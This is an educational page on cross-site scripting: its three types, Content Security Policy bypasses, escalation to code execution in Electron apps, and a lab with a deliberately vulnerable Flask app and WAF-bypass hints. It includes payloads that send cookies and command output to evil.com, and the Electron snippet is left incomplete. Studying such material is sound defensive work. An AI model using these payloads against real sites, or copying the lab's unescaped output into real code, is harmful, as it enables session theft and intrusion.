Cross-Site Scripting (XSS)

Three Types of XSS

Reflected XSS

Payload is part of the request (URL parameter, form input) and reflected back in the response without sanitization. Requires the victim to click a crafted link.

<!-- Vulnerable server response reflects ?name= directly -->
<p>Hello, <script>alert(1)</script></p>

<!-- Attacker URL -->
https://target.com/search?q=<script>alert(document.cookie)</script>

Stored XSS

Payload is persisted server-side (database, comment field, profile) and served to every user who views the page. Most dangerous — no user interaction beyond visiting the page.

<!-- Attacker posts a comment containing: -->
<img src=x onerror="fetch('https://evil.com/steal?c='+document.cookie)">

<!-- Every user viewing the comment section executes the payload -->

DOM-based XSS

Payload never leaves the browser. Vulnerable client-side JavaScript reads a source (URL fragment, location.hash, document.referrer) and writes it to a sink (innerHTML, eval, document.write).

// Vulnerable client-side code
let userInput = location.hash.substring(1);
document.getElementById("output").innerHTML = userInput;

// Exploit URL:
// https://target.com/page#<img src=x onerror=alert(1)>

CSP Bypass Techniques

Common CSP Headers

# Restrictive CSP
Content-Security-Policy: default-src 'self'; script-src 'self'

# CSP with unsafe-inline (vulnerable!)
Content-Security-Policy: script-src 'self' 'unsafe-inline'

# CSP with nonce
Content-Security-Policy: script-src 'nonce-abc123'

unsafe-inline Present

If 'unsafe-inline' is in script-src, inline scripts execute normally — CSP provides no XSS protection.

<script>alert(1)</script>  <!-- works with unsafe-inline -->

Nonce Reuse / Leaking

<!-- If nonce is predictable or reused across requests -->
<script nonce="LEAKED_NONCE">alert(1)</script>

<!-- If nonce appears in the page source, inject: -->
<script nonce="EXTRACTED_NONCE">alert(1)</script>

base-uri Missing

<!-- If base-uri is not restricted, hijack relative script paths -->
<base href="https://evil.com/">
<!-- Now all relative src="/js/app.js" loads from evil.com -->

JSONP Endpoints on Whitelisted Domains

<!-- If CSP allows scripts from a CDN that has JSONP endpoints -->
<!-- script-src cdn.example.com -->
<script src="https://cdn.example.com/jsonp?callback=alert(1)//"></script>

CSP Bypass via Policy Injection

<!-- If reflected input ends up in CSP header -->
Content-Security-Policy: script-src 'self' USER_INPUT
<!-- Inject: 'unsafe-inline'; to allow inline scripts -->

XSS can lead to remote code execution in specific scenarios:

Electron Apps

If nodeIntegration is enabled or contextIsolation is disabled:

require('child_process').exec('id', (err, stdout) => {
    fetch('https://evil.com/rce?out=' + btoa(stdout));

// If the app renders user input server-side in a headless browser
// inject payload to read local files

Lab 4: XSS with Filter Bypass

Hard

Objective: Bypass a WAF/filter that blocks common XSS keywords and tags.

# app.py — Flask with XSS filter
import re
from flask import Flask, request

app = Flask(__name__)

def waf(payload):
    """Blocks common XSS patterns"""
    blocked = ['script', 'onerror', 'onload', 'alert', 'eval',
               'javascript:', 'document.cookie']
    lower = payload.lower()
    for word in blocked:
        if word in lower:
            return True
    if re.search(r'on\w+=', lower):
        return True
    return False

@app.route('/search')
def search():
    q = request.args.get('q', '')
    if waf(q):
        return '<h1>WAF Blocked!</h1><p>Malicious input detected.</p>'
    return f'<h1>Results for: {q}</h1>'

app.run(debug=True)

Tasks:

  1. Try basic payloads — confirm they're blocked
  2. Analyze what the WAF actually filters (keyword list + regex)
  3. Bypass strategies:
    • Use event handlers not matched by on\w+= regex (hint: what about oncut, oncopy?)
    • Try HTML encoding within attributes
    • Use confirm() or prompt() instead of alert()
    • Use <details open ontoggle=...> or <svg> payloads
    • Try Function('ale'+'rt(1)')() construction
  4. Achieve JavaScript execution despite the WAF
